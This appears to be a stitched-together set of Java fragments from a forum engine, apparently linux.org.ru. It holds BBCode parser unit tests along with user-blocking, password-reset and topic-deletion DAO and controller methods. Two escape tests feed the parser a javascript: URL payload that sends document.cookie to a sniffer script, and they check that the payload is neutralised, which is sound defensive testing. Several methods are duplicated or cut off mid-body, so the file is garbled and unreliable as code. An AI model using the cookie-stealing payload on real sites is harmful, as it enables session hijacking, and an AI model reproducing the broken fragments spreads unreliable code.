public void codeEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code] \" code&code \" [/code] " , null ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " ) ; } 
public void brTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [br] " , null ) , " <p><br></p> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [b]hello world[/b] " , null ) , " <p><b>hello world</b></p> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [i]hello world[/i] " , null ) , " <p><i>hello world</i></p> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [s]hello world[/s] " , null ) , " <p><s>hello world</s></p> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [strong]hello world[/strong] " , null ) , " <p><strong>hello world</strong></p> " ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [quote][/quote] " , null ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url]http:linux.org.ru[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru]linux[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" >linux</a></p> " ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " ) ; } 
public void listTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list][*]one[*]two[*]three[/list] " , null ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; } 
public void codeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code][list][*]one[*]two[*]three[/list][/code] " , null ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " ) ; } 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [code][/code] " , null ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=cxx]#include <stdio.h>[/code] " , null ) ) ; } 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=foo]#include <stdio.h>[/code] " , null ) ) ; } 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , ParserUtil . bb2xhtml ( " some text n some again text [url=http:example.com]example[/url] example " , null ) ) ; 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][/url] " , null ) ) ; } 
public void paraTest1 ( ) { Assert . assertEquals ( " <p>some1 text</p><p>some2 text n</p><ul> n<li>one n</li><li>two</li></ul> n<p><a href= \" http:www.example.com \" >http:www.example.com</a> - some3 text</p> " , ParserUtil . bb2xhtml ( " some1 text nsome2 text n[list] n[*]one n[*]two n[/list] n[url]http:www.example.com[/url] - some3 text " , null ) ) ; 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][b]linux[/b][/url] " , null ) , " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " ) ; } 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][/url] " , null ) ) ; 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , null ) ) ; 
public static String bb2xhtml ( String bbcode ) { return parserWithOutImages . parse ( new RootNode ( parserWithOutImages ) , bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setConnection ( db ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; } 
public String renderXHtml ( ) { throw new UnsupportedOperationException ( ) ; } 
public String renderBBCode ( ) { throw new UnsupportedOperationException ( ) ; } 
public String renderChildrenXHtml ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( ) ) ; } return stringBuilder . toString ( ) ; } 
public String renderXHtml ( ) { return renderChildrenXHtml ( ) ; } 
public String renderXHtml ( ) { return bbtag . renderNodeXhtml ( this ) ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; String pattern ; try { if ( db ! = null ) { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } else { pattern = " %s " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } return String . format ( pattern , Parser . escape ( memberName ) , Parser . escape ( memberName ) ) ; 
public void pTest ( ) { Assert . assertEquals ( " <p>test ntest1</p><p>test2</p> " , ParserUtil . bb2xhtml ( " test ntest1 ntest2 " ) ) ; } 
public void tagEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " <br> " ) , " <p>&lt;br&gt;</p> " ) ; } 
public void urlEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " ) , 
public void urlEscapeWithTagsTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " ) , 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " ) , " <p>0</p><ul><li>1</li><li>2</li></ul> " ) ; } 
public void codeEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code] \" code&code \" [/code] " ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " ) ; } 
public void brTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [br] " ) , " <p><br></p> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [b]hello world[/b] " ) , " <p><b>hello world</b></p> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [i]hello world[/i] " ) , " <p><i>hello world</i></p> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [s]hello world[/s] " ) , " <p><s>hello world</s></p> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [strong]hello world[/strong] " ) , " <p><strong>hello world</strong></p> " ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [quote][/quote] " ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url]http:linux.org.ru[/url] " ) , " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru]linux[/url] " ) , " <p><a href= \" http:linux.org.ru \" >linux</a></p> " ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " ) , " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][b]linux[/b][/url] " ) , " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " ) ; } 
public void listTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list][*]one[*]two[*]three[/list] " ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; } 
public void codeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code][list][*]one[*]two[*]three[/list][/code] " ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " ) ; } 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [code][/code] " ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=cxx]#include <stdio.h>[/code] " ) ) ; 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=foo]#include <stdio.h>[/code] " ) ) ; 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , ParserUtil . bb2xhtml ( " some text n some again text [url=http:example.com]example[/url] example " ) ) ; 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " ) ) ; 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][/url] " ) ) ; 
public void paraTest1 ( ) { Assert . assertEquals ( " <p>some1 text</p><p>some2 text n</p><ul> n<li>one n</li><li>two</li></ul> n<p><a href= \" http:www.example.com \" >http:www.example.com</a> - some3 text</p> " , ParserUtil . bb2xhtml ( " some1 text nsome2 text n[list] n[*]one n[*]two n[/list] n[url]http:www.example.com[/url] - some3 text " ) ) ; 
public Message getNextMessage ( Connection db , SectionDao sectionStore ) throws SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT min(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public Message getPreviousMessage ( Connection db , SectionDao sectionStore ) throws SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT max(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public void processRow ( ResultSet rs ) throws SQLException { Section section = new Section ( rs ) ; sections . put ( section . getId ( ) , section ) ; sectionsList . add ( section ) ; } 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " ) ) ; Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url] nhttp:linux.org.ru[/url] " ) ) ; 
public static Group getGroup ( Connection db , int id ) throws SQLException , BadGroupException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , true ) ; JdbcTemplate jdbcTemplate = new JdbcTemplate ( scds ) ; return GroupDao . getGroup ( jdbcTemplate , id ) ; } 
public Group getGroup ( Connection db , String name ) throws SQLException , BadGroupException { PreparedStatement st = db . prepareStatement ( " SELECT id FROM groups WHERE section=? AND urlname=? " ) ; st . setInt ( 1 , id ) ; st . setString ( 2 , name ) ; ResultSet rs = st . executeQuery ( ) ; if ( ! rs . next ( ) ) { throw new BadGroupException ( " group not found " ) ; } return Group . getGroup ( db , rs . getInt ( 1 ) ) ; } 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) throws SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = Group . getGroup ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " topTags " , Tags . getTopTags ( db ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) throws Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . toString ( offset ) ) ; } if ( year ! = null & & month ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . toString ( year ) + '/' + Integer . toString ( month ) ) ; } if ( groupId ! = null ) { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; Group group = Group . getGroup ( db , groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + '/' ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public Group getGroup ( int id ) throws BadGroupException { return getGroupInternal ( jdbcTemplate , id ) ; } 
public static Group getGroup ( JdbcTemplate jdbcTemplate , int id ) throws BadGroupException { return getGroupInternal ( jdbcTemplate , id ) ; } 
private static Group getGroupInternal ( JdbcTemplate jdbcTemplate , int id ) throws BadGroupException { try { return jdbcTemplate . queryForObject ( 
public Group mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Group ( resultSet ) ; } 
private Node descend ( Node currentNode ) { return currentNode . getChildren ( ) . get ( currentNode . getChildren ( ) . size ( ) - 1 ) ; } 
private Node ascend ( Node currentNode ) { return currentNode . getParent ( ) ; } 
private Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node tempNode = currentNode ; while ( true ) { if ( tempNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( tempNode ) ) { TagNode node = ( TagNode ) tempNode ; String tagName = node . getBbtag ( ) . getName ( ) ; if ( tagName . equals ( name ) | | ( " url " . equals ( name ) & & tagName . equals ( " url2 " ) ) ) { currentNode = tempNode ; currentNode = ascend ( currentNode ) ; break ; } } tempNode = tempNode . getParent ( ) ; } return currentNode ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( new UserDao ( new SingleConnectionDataSource ( db , true ) ) ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , UserDao userDao ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; String pattern ; try { if ( userDao ! = null ) { User user = userDao . getUser ( memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } else { pattern = " %s " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } return String . format ( pattern , Parser . escape ( memberName ) , Parser . escape ( memberName ) ) ; } 
public void splinterTest1 ( ) throws Exception { http:www.linux.org.ru/forum/linux-org-ru/6448266 UserDao userDao = mock(UserDao.class); User user = mock(User.class); when(user.isBlocked()).thenReturn(false); when(userDao.getUser("splinter")).thenReturn(user); Assert.assertEquals(ParserUtil.bb2xhtml("[url=http:www.fishing.org/][user]splinter[/user][/url]", true, true, "", userDao), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href='/people/splinter/profile'>splinter</a></span></p>"); 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) throws SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = Group . getGroup ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , preparedMessage . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " topTags " , Tags . getTopTags ( db ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
private List < PreparedMessage > getPreparedMessages ( Connection db , boolean cached ) throws SQLException { List < Message > messages = cached ? getMessagesCached ( db ) : getMessages ( db ) ; List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { pm . add ( new PreparedMessage ( db , message , false ) ) ; } return pm ; } 
public void initTest ( ) throws Exception { maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . thenReturn ( false ) ; when ( JB . isBlocked ( ) ) . thenReturn ( false ) ; when ( isden . isBlocked ( ) ) . thenReturn ( true ) ; userDao = mock ( UserDao . class ) ; when ( userDao . getUser ( " maxcom " ) ) . thenReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . thenReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . thenReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . thenThrow ( new UserNotFoundException ( " hizel " ) ) ; 
public void userTest ( ) { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href='/people/maxcom/profile'>maxcom</a></span></p> " , ParserUtil . bb2xhtml ( " [user]maxcom[/user] " , true , true , " " , userDao ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href='/people/isden/profile'>isden</a></s></span></p> " , ParserUtil . bb2xhtml ( " [user]isden[/user] " , true , true , " " , userDao ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , ParserUtil . bb2xhtml ( " [user]hizel[/user] " , true , true , " " , userDao ) ) ; 
public void initTest ( ) throws Exception { userDao = mock ( UserDao . class ) ; user = mock ( User . class ) ; when ( user . isBlocked ( ) ) . thenReturn ( false ) ; when ( userDao . getUser ( " splinter " ) ) . thenReturn ( user ) ; } 
public void splinterTest1 ( ) throws Exception { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals(ParserUtil.bb2xhtml("[url=http:www.fishing.org/][user]splinter[/user][/url]", true, true, "", userDao), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href='/people/splinter/profile'>splinter</a></span></p>"); 
public boolean isPreviewMode ( ) { return preview ! = null ; } 
private static void createReplyTo ( Message topic , Integer replyTo , Map < String , Object > params , Connection db ) throws SQLException , MessageNotFoundException , AccessViolationException , UserNotFoundException { if ( replyTo ! = null & & replyTo > 0 ) { Comment onComment = new Comment ( db , replyTo ) ; 
public void setAsText ( String s ) throws IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } try { setValue ( userDao . getUser ( s ) ) ; 
public ModelAndView showForm ( @ModelAttribute ( " add " ) AddCommentRequest add , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( @ModelAttribute ( " add " ) AddCommentRequest add , Errors errors , ServletRequest request ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showFormReply ( @ModelAttribute ( " add " ) AddCommentRequest add , Errors errors , ServletRequest request ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showFormTopic ( @ModelAttribute ( " add " ) AddCommentRequest add , Errors errors ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showFormTopic ( @ModelAttribute ( " add " ) AddCommentRequest add , Errors errors , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { return deleteReplys ( msgid , user , score , 0 ) ; } 
public Integer mapRow ( ResultSet rs , int rowNum ) throws SQLException { return rs . getInt ( 1 ) ; } 
public void changeScore ( User user , int delta ) { jdbcTemplate . update ( " UPDATE users SET score=score+? WHERE id=? " , delta , user . getId ( ) ) ; } 
public void toggleCorrector ( User user ) { if ( user . canCorrect ( ) ) { jdbcTemplate . update ( " UPDATE users SET corrector='f' WHERE id=? " , user . getId ( ) ) ; 
public String resetPassword ( User user ) { String password = StringUtil . generatePassword ( ) ; setPassword ( user , password ) ; return password ; } 
public void block ( User user , User moderator , String reason ) throws UserNotFoundException { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; Update cache getUser(user.getId()); } 
public void unblock ( User user ) { jdbcTemplate . update ( " UPDATE users SET blocked='f' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " DELETE FROM ban_info WHERE userid=? " , user . getId ( ) ) ; } 
public void processRow ( ResultSet rs ) throws SQLException { int mid = rs . getInt ( " id " ) ; jdbcTemplate . update ( " UPDATE topics SET deleted='t',sticky='f' WHERE id=? " , mid ) ; jdbcTemplate . update ( " INSERT INTO del_info (msgid, delby, reason, deldate) values(?,?,?, CURRENT_TIMESTAMP) " , mid ) ; } 
public ModelAndView showFormTopic ( @ModelAttribute ( " add " ) @Valid AddCommentRequest add , Errors errors , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void initBinder ( WebDataBinder binder ) { binder . setValidator ( new AddCommentRequestValidator ( ) ) ; } 
public boolean supports ( Class < ? > clazz ) { return AddCommentRequest . class . equals ( clazz ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; UserDao singleUserDao = new UserDao ( ) ; singleUserDao . setJdbcTemplate ( new SingleConnectionDataSource ( db , true ) ) ; rootNode . setUserDao ( singleUserDao ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; } 
public void removeUserInfo ( User user ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . trim ( ) . isEmpty ( ) ) return ; setUserInfo ( user , null ) ; changeScore ( user , - 10 ) ; } 
public String resetPasswordWithoutTransaction ( User user ) { String password = StringUtil . generatePassword ( ) ; setPasswordWithoutTransaction ( user , password ) ; return password ; } 
public void block ( User user , User moderator , String reason ) throws UserNotFoundException { blockWithoutTransaction ( user , moderator , reason ) ; } 
public void blockWithoutTransaction ( User user , User moderator , String reason ) throws UserNotFoundException { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; Update cache getUser(user.getId()); } 
public void blockWithResetPassword ( User user , User moderator , String reason ) throws UserNotFoundException { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String password = encryptor . encryptPassword ( StringUtil . generatePassword ( ) ) ; jdbcTemplate . update ( " UPDATE users SET passwd=?, lostpwd = 'epoch' WHERE id=? " , password , user . getId ( ) ) ; Update cache getUser(user.getId()); } 
public void blockWithResetPassword ( User user , User moderator , String reason ) throws UserNotFoundException { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String password = encryptor . encryptPassword ( StringUtil . generatePassword ( ) ) ; jdbcTemplate . update ( " UPDATE users SET passwd=?, lostpwd = 'epoch' WHERE id=? " , password , user . getId ( ) ) ; Update cache getUser(user.getId()); } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new AddCommentRequestValidator ( ) ) ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Message . class , new PropertyEditorSupport ( ) { @Override 
public void setAsText ( String text ) throws IllegalArgumentException { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void checkDuplication ( String ip , boolean trusted , Errors errors ) throws DuplicationException { if ( ! check ( ip , trusted ) ) { errors . reject ( null , DuplicationException . MESSAGE ) ; 
